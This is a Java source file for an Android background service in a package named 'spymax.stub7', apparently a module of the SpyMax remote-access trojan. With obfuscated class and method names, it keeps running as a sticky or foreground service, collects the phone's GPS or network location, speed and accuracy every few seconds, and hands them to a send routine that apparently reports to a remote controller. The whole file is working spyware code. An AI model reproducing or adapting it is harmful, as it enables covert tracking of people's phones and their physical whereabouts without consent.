package spymax.stub7;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
public class ClassGen5 extends Service {
    public static long t = 5000 ;
    public static long d = 0;
    public static double lat = 0.0;
    public static double lon = 0.0;
    public static float ac = 0.0f;
    public static float sp = 0.0f;
    public static LocationListener LL;
    public static LocationManager LM;
    private String vul[];
    static ClassGen5 st;
    public int onStartCommand(Intent intent, int flags, int startId) {
        String wx = getApplicationContext().getResources().getString(R.string.o1o2o3o4o5o6);
        if (intent != null){
            if (intent.hasExtra(wx)){

                Context ctx = getApplicationContext();
                ClassGen3.pr = ctx.getResources().getString(R.string.t1t2t3t4t5t6);
                if (ClassGen3.pr.charAt(1) == ClassGen3.c1)
                {
                    Notification ntf = ClassGen3.Foreground(ctx);
                    if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.N) {
                        ClassGen3.sf2 = 1;
                        st = this;
                        ClassGen3.sr(ctx,new Intent(this, ClassGen13.class));
                    }else{
                        if (ntf != null){
                            startForeground(7774,ntf);
                        }
                    }
                }

                vul = intent.getStringArrayExtra(wx);
                ru();
            }
        }
        return START_STICKY;
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    private void ru() {
        try {

            ClassGen5.LM = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
            ClassGen5.LL = new LocationListener() {
                public void onLocationChanged(Location L) {
                    if (L != null) {
                        ClassGen5.lon = L.getLongitude();
                        ClassGen5.lat = L.getLatitude();
                        ClassGen5.ac = L.getAccuracy();
                        ClassGen5.sp = L.getSpeed();
                        s(ClassGen5.lat,ClassGen5.lon,ClassGen5.ac);
                        boolean gps = ClassGen5.LM.isProviderEnabled(LocationManager.GPS_PROVIDER);
                        if(gps){
                            try{
                                ClassGen5.LM.removeUpdates(ClassGen5.LL);
                            } catch (Exception e) {}
                            ClassGen5.LM.requestLocationUpdates(LocationManager.GPS_PROVIDER, ClassGen5.t, ClassGen5.d, ClassGen5.LL);
                        }
                    }
                }
                public void onStatusChanged(String provider, int status, Bundle extras) {
                }
                public void onProviderEnabled(String provider) {
                }
                public void onProviderDisabled(String provider) {
                }
            };
            boolean net = ClassGen5.LM.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
            boolean gps = ClassGen5.LM.isProviderEnabled(LocationManager.GPS_PROVIDER);
            if (!gps && !net){
                p();
            }else{
                if(net) {
                    Location L = LM.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if(L != null){
                        ClassGen5.lon = L.getLongitude();
                        ClassGen5.lat = L.getLatitude();
                        ClassGen5.ac = L.getAccuracy();
                        ClassGen5.sp = L.getSpeed();
                        s(ClassGen5.lat,ClassGen5.lon,ClassGen5.ac);
                    }
                    ClassGen5.LM.requestLocationUpdates(LocationManager.NETWORK_PROVIDER , ClassGen5.t, ClassGen5.d, ClassGen5.LL);
                }else if (gps){
                    Location L = ClassGen5.LM.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if(L != null){
                        ClassGen5.lon = L.getLongitude();
                        lat = L.getLatitude();
                        ClassGen5.ac = L.getAccuracy();
                        ClassGen5.sp = L.getSpeed();
                        s(lat,ClassGen5.lon,ClassGen5.ac);
                    }
                    ClassGen5.LM.requestLocationUpdates(LocationManager.GPS_PROVIDER , ClassGen5.t, ClassGen5.d, ClassGen5.LL);
                }
            }
        } catch (Exception e) {
            ClassGen5.lon = 0.0;
            ClassGen5.lat = 0.0;
            p();
        }
    }
    private void s(double la,double lo , float acc) {
        int ed =(int)(ClassGen5.sp);
        String d = la + vul[0] + lo + vul[0] + acc + vul[0] + ed;
        ClassGen2.se(vul[1],d.getBytes());
    }
    private void p(){
        Intent i = new Intent(this, ClassGen5.class);
        this.stopService(i);
    }
    @Override
    public void onDestroy(){
        ClassGen3.sf2 = 0;
        st = null;
        try{

            ClassGen5.LM.removeUpdates(ClassGen5.LL);
        } catch (Exception e) {}
        super.onDestroy();
    }

}

